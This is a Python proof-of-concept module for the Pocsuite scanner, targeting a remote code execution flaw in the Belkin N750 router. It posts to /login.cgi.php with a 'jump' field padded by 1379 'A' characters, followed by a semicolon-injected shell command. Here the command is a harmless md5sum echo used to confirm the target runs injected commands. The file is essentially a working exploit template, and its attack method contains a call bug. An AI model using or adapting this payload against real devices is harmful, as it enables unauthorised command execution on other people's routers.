#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import string

class TestPOC(POCBase):
    name = "Belkin N750 RCE"
    vulID = ''
    author = ['sebao']
    vulType = 'Code Execution'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/35184/'
    desc = 'Module exploits Belkin N750 Remote Code Execution vulnerability which allows executing commands on operation system level.'


    vulDate = ''
    createDate = '2017-10-13'
    updateDate = '2017-10-13'

    appName = 'belkin'
    appVersion = 'Belkin N750'
    dork = ''
    appPowerLink = 'http://www.belkin.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        a = ''.join(random.sample(string.ascii_letters + string.digits, 6))
        md5 = hashlib.md5()
        md5.update(a)
        md5hash = md5.hexdigest()
        url = self.url + '/login.cgi.php'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        cmd = "echo -n {}|md5sum".format(a)
        data = "GO=&jump=" + "A" * 1379 + ";{};&ps=\n\n".format(cmd)
        resp = req.post(url,headers=headers,data=data)
        if md5hash in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url


        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
